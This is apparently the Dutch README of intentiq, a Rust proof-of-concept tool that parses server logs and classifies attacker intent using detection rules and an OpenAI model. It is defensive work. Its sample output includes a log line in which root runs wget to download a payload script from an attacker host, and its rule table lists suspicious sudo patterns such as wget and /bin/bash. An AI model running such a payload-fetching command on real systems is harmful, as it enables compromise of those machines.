# intentiq (proof of concept)

Een AI-gedreven cybersecurity CLI-tool geschreven in Rust die systeemlogs analyseert en vertaalt naar menselijke intentie.

Waar traditionele monitoring stopt bij _"wat is er gebeurd?"_, gaat intentiq een stap verder: **"waarom gebeurt dit en met welke intentie?"**

De tool combineert een snel **rule-based detectiesysteem** met een **LLM via de OpenAI API** voor twijfelgevallen, en slaat aanvalspatronen op als vectoren in **Qdrant** voor toekomstige similarity search.

---

## Inhoudsopgave

- [Features](#features)
- [Architectuur](#architectuur)
- [Installatie](#installatie)
- [Gebruik](#gebruik)
- [Voorbeeldoutput](#voorbeeldoutput)
- [Detectieregels](#detectieregels)
- [Projectstructuur](#projectstructuur)

---

## Features

- **Log parsing** voor `auth.log`, `syslog`, `ufw.log` en nginx `access.log`
- **Actorgroepering**: events worden gekoppeld per IP-adres of gebruikersnaam, inclusief het linken van orphan events (zoals een suspicious binary zonder eigen IP) aan de juiste actor binnen een tijdsvenster
- **Rule-based intent detection** met vijf categorieën: `reconnaissance`, `credential_access`, `privilege_escalation`, `persistence`, `data_exfiltration`
- **Hybride LLM-classificatie**: actors met een gemiddelde confidence tussen 0.30 en 0.70 worden automatisch doorgestuurd naar OpenAI (`gpt-4o-mini`) voor een tweede analyse
- **Vector opslag in Qdrant**: elke actor wordt omgezet naar een embedding (`text-embedding-3-small`) en opgeslagen, als basis voor toekomstige similarity search tussen aanvalspatronen
- **MongoDB persistentie** van events, intent-resultaten en actor-samenvattingen
- **Leesbare CLI-rapportage** met actor, confidence, intenties en bewijs
- **Volledig gecontaineriseerd** via Docker Compose (app, MongoDB, Qdrant)

---

## Architectuur

```
Logbestanden
    │
    ▼
[Parser module]          → Event { timestamp, source, user, ip, event_type, command, message, size }
    ▼
[Grouping module]        → Actor { ip/user → Vec<Event> }, inclusief orphan-event linking
    ▼
[Detection module]
    ├── Rule-based engine → IntentResult { actor, intent, confidence, evidence }
    └── OpenAI LLM         → bij gemiddelde confidence tussen 0.30 en 0.70
    ▼
[Storage module]
    ├── MongoDB  → events, results, actorsummary
    └── Qdrant   → actor-embeddings voor similarity search
    ▼
[Output module]          → CLI-rapport
```

---

## Installatie

### Vereisten

- [Docker](https://docs.docker.com/get-docker/) en Docker Compose
- Een OpenAI API key ([platform.openai.com](https://platform.openai.com))

### Stappen

1. **Clone de repository**
   ```bash
   git clone https://github.com/m-vanrompuy/intentiq.git
   cd intentiq
   ```

2. **Maak een `.env` bestand aan** in de root van het project:
   ```
   OPENAI_API_KEY=jouw-openai-api-key
   OPENAI_CHAT_MODEL=gpt-4o-mini
   OPENAI_EMBED_MODEL=text-embedding-3-small
   ```

3. **Build en start alle services**
   ```bash
   docker compose up --build
   ```

   Dit start drie containers:
   - `intentiq-app` — de Rust applicatie
   - `intentiq-mongo` — MongoDB op poort 27017
   - `intentiq-qdrant` — Qdrant op poort 6333 (REST) en 6334 (gRPC)

4. **Bekijk de Qdrant dashboard** (optioneel)
   ```
   http://localhost:6333/dashboard
   ```

---

## Gebruik

De tool leest automatisch de logbestanden in de `logs/` map bij het opstarten:

```
logs/
├── auth.log
├── syslog
├── ufw.log
└── nginx/
    └── access.log
```

Vervang de inhoud van deze bestanden door je eigen logdata en herstart de container:

```bash
docker compose restart app
```

Alleen de app-container opnieuw bouwen na een codewijziging:

```bash
docker compose up --build app
```

Alle logs van enkel de app bekijken (zonder Mongo/Qdrant ruis):

```bash
docker compose logs app
```

---

## Voorbeeldoutput

```
[ACTOR] 185.220.101.12
[CONFIDENCE] 84.5%
[INTENTS] credential_access, data_exfiltration, privilege_escalation + persistence, reconnaissance
[EVIDENCE]
  • May  6 09:14:02 server sshd[1035]: Failed password for invalid user admin from 185.220.101.12 port 41234 ssh2
  • May  6 09:16:05 server sudo: root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/bash
  • May  6 09:17:30 server sudo: root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/wget http://malicious.ru/payload.sh
  • May  6 10:01:10 server "POST /admin/export HTTP/1.1" 200 98304
----------------------------------------
```

Voor actors met een lage of ambigue confidence wordt het oordeel van de LLM apart getoond:

```
LLM analyse voor 10.0.0.5:
  intents: ["persistence"]
  confidence: 0.5
  evidence: ["LLM analyse: suspicious binary in /tmp zonder gekoppelde login, mogelijk legitiem proces"]
```

---

## Detectieregels (Pas aan naar wens)

| Patroon | Intent | Confidence |
|---|---|---|
| ≥5 failed logins van zelfde IP | `reconnaissance` | 0.75 |
| Failed logins gevolgd door succesvolle login | `credential_access` | 0.85 |
| Sessie/login + verdachte sudo (`/tmp`, `/bin/bash`, `wget`) + suspicious binary | `privilege_escalation` + `persistence` | 0.90 |
| Sessie/login + verdachte sudo (zonder suspicious binary) | `privilege_escalation` | 0.70 |
| Suspicious binary zonder gekoppelde sudo | `persistence` | 0.50 |
| ≥5 firewall blocks van zelfde IP | `reconnaissance` | 0.80 |
| HTTP-response ≥50.000 bytes | `data_exfiltration` | 0.88 |

De uiteindelijke confidence van een actor is het **gemiddelde** van alle gevonden intent-confidences. Actors met een gemiddelde tussen 0.30 en 0.70 worden automatisch doorgestuurd naar de LLM voor een tweede, onafhankelijke analyse.

---

## Projectstructuur

```
intentiq/
├── src/
│   ├── main.rs                  # Entrypoint, orchestratie
│   ├── parser/                  # auth.rs, syslog.rs, ufw.rs, nginx.rs
│   ├── models/event.rs          # Event, IntentResult, ActorSummary
│   ├── grouping/mod.rs          # Actorgroepering, orphan-linking, aggregatie
│   ├── detection/
│   │   ├── rules.rs             # Rule-based engine
│   │   ├── llm.rs               # OpenAI chat-analyse
│   │   └── mod.rs               # filter_low_confidence
│   ├── storage/
│   │   ├── mongo.rs             # MongoDB persistentie
│   │   └── qdrant.rs            # Vector opslag via OpenAI embeddings
│   ├── output/report.rs         # CLI-rapportage
│   └── utils/mod.rs             # Timestamp parsing
├── logs/                        # Input logbestanden
├── Dockerfile
├── docker-compose.yml
└── .env                         # OPENAI_API_KEY (niet in git)
```

---

## Tech stack

| Component | Technologie |
|---|---|
| Taal | Rust (edition 2024) |
| Log parsing | `regex` |
| Async runtime | `tokio` |
| HTTP client | `reqwest` |
| Event opslag | MongoDB (`mongodb` crate) |
| Vector opslag | Qdrant (`qdrant-client` crate) |
| LLM & embeddings | OpenAI API (`gpt-4o-mini`, `text-embedding-3-small`) |
| Containerisatie | Docker Compose |

---
